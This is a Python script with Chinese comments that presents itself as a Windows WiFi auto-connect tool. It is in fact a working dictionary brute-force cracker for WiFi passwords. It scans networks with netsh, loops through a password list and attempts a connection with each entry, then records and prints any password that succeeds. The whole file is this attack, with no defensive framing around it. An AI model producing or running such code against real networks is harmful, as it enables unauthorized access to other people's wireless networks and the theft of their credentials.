import argparse
import json
import os
import subprocess
import time
import urllib.parse
import functools
from config.config import *  # 导入所有配置

# 全局缓存
ENCRYPTION_CACHE = {}


def init_environment():
    """初始化必要目录和文件"""
    os.makedirs(CONFIG_DIR, exist_ok=True)
    os.makedirs(os.path.dirname(PASS_DICT_FILE), exist_ok=True)

    if not os.path.exists(TEMPLATE_PATH):
        raise FileNotFoundError(f"必须创建配置文件: {TEMPLATE_PATH}")


@functools.lru_cache(maxsize=32)
def scan_wifi():
    """扫描可用WiFi网络（优化版）"""
    try:
        result = subprocess.run(
            "chcp 65001 && netsh wlan show networks mode=bssid",
            shell=True,
            capture_output=True,
            text=True,
            encoding="utf-8",
            errors="ignore",
            timeout=3  # 添加超时
        )
        networks = result.stdout.split("\n")

        wifi_list = []
        current_ssid = None

        for line in networks:
            line = line.strip()
            if line.startswith("SSID"):
                current_ssid = line.split(":")[1].strip()
            elif line.startswith("Authentication"):
                encryption = line.split(":")[1].strip()
                if current_ssid:
                    wifi_list.append((current_ssid, encryption))
                    # 更新缓存
                    ENCRYPTION_CACHE[current_ssid] = encryption
                    current_ssid = None
        return wifi_list

    except Exception as e:
        print(f"扫描失败: {str(e)}")
        return []


def generate_config(ssid, password, encryption):
    """生成WiFi配置文件"""
    auth, cipher = DEFAULT_AUTH, DEFAULT_CIPHER  # 使用默认值
    for key in ENCRYPTION_MAP:
        if key in encryption:
            auth, cipher = ENCRYPTION_MAP[key]
            break

    with open(TEMPLATE_PATH, "r", encoding="utf-8") as f:
        template = f.read()

    # 确保SSID中的特殊字符被正确处理
    config = template.format(
        ssid=ssid.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace("'", "&apos;").replace('"',
                                                                                                                 "&quot;"),
        auth=auth,
        cipher=cipher,
        password=password
    )
    return config


def check_connection(target_ssid):
    """极速连接检测（优化版）"""
    try:
        # 快速获取连接状态
        result = subprocess.run(
            ["netsh", "wlan", "show", "interfaces"],
            capture_output=True,
            text=True,
            encoding='utf-8',
            errors='ignore',
            timeout=1.5  # 超时控制
        )

        # 快速解析
        output = result.stdout
        if "已连接" in output or "connected" in output.lower():
            if target_ssid in output:
                # 极速IP检查
                ip_result = subprocess.run(
                    ["ipconfig"],
                    capture_output=True,
                    text=True,
                    encoding='utf-8',
                    errors='ignore',
                    timeout=1.5
                )
                return "IPv4" in ip_result.stdout, "连接成功"
        return False, "未连接"
    except Exception as e:
        return False, f"检测异常: {str(e)}"


def test_network():
    """极速网络检测（优化版）"""
    try:
        # 使用快速目标并减少ping次数
        process = subprocess.run(
            ["ping", "-n", PING_COUNT, "-w", "1000", PING_TARGET],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            timeout=3  # 总超时3秒
        )
        return process.returncode == 0
    except:
        return False


def disconnect_wifi():
    """断开当前WiFi连接（优化版）"""
    try:
        subprocess.run(
            ["netsh", "wlan", "disconnect"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            timeout=2
        )
        time.sleep(DISCONNECT_WAIT)
        return True
    except Exception as e:
        return False


def is_already_disconnected():
    """检查是否已断开连接"""
    try:
        result = subprocess.run(
            ["netsh", "wlan", "show", "interfaces"],
            capture_output=True,
            text=True,
            timeout=1
        )
        return "断开" in result.stdout or "disconnected" in result.stdout.lower()
    except:
        return False


def connect_wifi(ssid, password, encryption):
    """执行连接操作（极致优化版）"""
    profile_file = f"{ssid.replace(' ', '_')}.xml"
    try:
        # 避免不必要的断开
        if not is_already_disconnected():
            disconnect_wifi()

        # 生成配置文件
        config = generate_config(ssid, password, encryption)
        if not config:
            print("⚠️ 配置文件生成失败")
            return False

        # 写入配置文件
        with open(profile_file, "w", encoding="utf-8") as f:
            f.write(config)

        # 添加配置文件
        try:
            subprocess.run(
                ["netsh", "wlan", "add", "profile", f"filename={profile_file}"],
                check=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=5
            )
        except subprocess.TimeoutExpired:
            return False

        # 异步连接+快速轮询
        connect_proc = subprocess.Popen(
            ["netsh", "wlan", "connect", f"name={ssid}"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )

        # 极速连接检测
        start_time = time.time()
        while time.time() - start_time < FAST_WAIT_TIME:
            time.sleep(FAST_CHECK_INTERVAL)
            is_connected, status = check_connection(ssid)
            if is_connected:
                # 极速网络验证
                if test_network():
                    # 原子化保存密码
                    try:
                        data = {}
                        if os.path.exists(PASSWD_FILE):
                            try:
                                with open(PASSWD_FILE, "r", encoding="utf-8") as f:
                                    content = f.read().strip()
                                    if content:
                                        data = json.loads(content)
                            except json.JSONDecodeError:
                                pass
                        data[ssid] = password
                        os.makedirs(os.path.dirname(PASSWD_FILE), exist_ok=True)
                        temp_file = PASSWD_FILE + ".tmp"
                        with open(temp_file, "w", encoding="utf-8") as f:
                            json.dump(data, f, indent=2, ensure_ascii=False)
                        os.replace(temp_file, PASSWD_FILE)
                    except Exception:
                        pass
                    connect_proc.terminate()
                    return True
                else:
                    disconnect_wifi()
                    break

        # 终止连接进程
        connect_proc.terminate()
        return False

    except Exception as e:
        return False
    finally:
        # 清理临时文件
        try:
            os.remove(profile_file)
        except:
            pass


def main():
    init_environment()

    parser = argparse.ArgumentParser(description="WiFi自动化连接工具")
    parser.add_argument("-m", required=True, choices=["scan", "conn"], help="操作模式")
    parser.add_argument("-s", help="目标SSID（连接模式需要）")
    args = parser.parse_args()

    if args.m == "scan":
        print("正在扫描WiFi...")
        networks = scan_wifi()
        print("\n发现网络：")
        for idx, (ssid, enc) in enumerate(networks, 1):
            print(f"{idx}. {ssid.ljust(20)} [{enc}]")

    elif args.m == "conn":
        if not args.s:
            print("必须使用 -s 指定SSID")
            return

        ssid = urllib.parse.unquote(args.s.replace("+", " "))
        print(f"开始连接: {ssid}")

        # 使用缓存或扫描获取加密方式
        if ssid in ENCRYPTION_CACHE:
            target_enc = ENCRYPTION_CACHE[ssid]
        else:
            print("扫描目标网络加密方式...")
            wifi_list = scan_wifi()
            found = False
            for scan_ssid, enc in wifi_list:
                if scan_ssid == ssid:
                    target_enc = enc
                    found = True
                    break
            if not found:
                print(f"错误：未找到目标SSID '{ssid}'")
                return

        # 修复: 在with块内直接迭代文件
        try:
            with open(PASS_DICT_FILE, "r") as f:
                count = 0
                start_time = time.time()

                # 直接迭代文件对象
                for line in f:
                    pwd = line.strip()
                    if not pwd:  # 跳过空行
                        continue

                    count += 1
                    print(f"尝试 #{count}: {pwd}")

                    if connect_wifi(ssid, pwd, target_enc):
                        print(f"\n✅ 连接成功！\nSSID: {ssid}\nPassword: {pwd}")
                        print(f"耗时: {time.time() - start_time:.1f}秒, 尝试次数: {count}")
                        return

                    # 极速断开（准备下次尝试）
                    disconnect_wifi()
        except FileNotFoundError:
            print(f"密码文件不存在: {PASS_DICT_FILE}")
            return

        print("⛔ 所有密码尝试失败")


if __name__ == "__main__":
    main()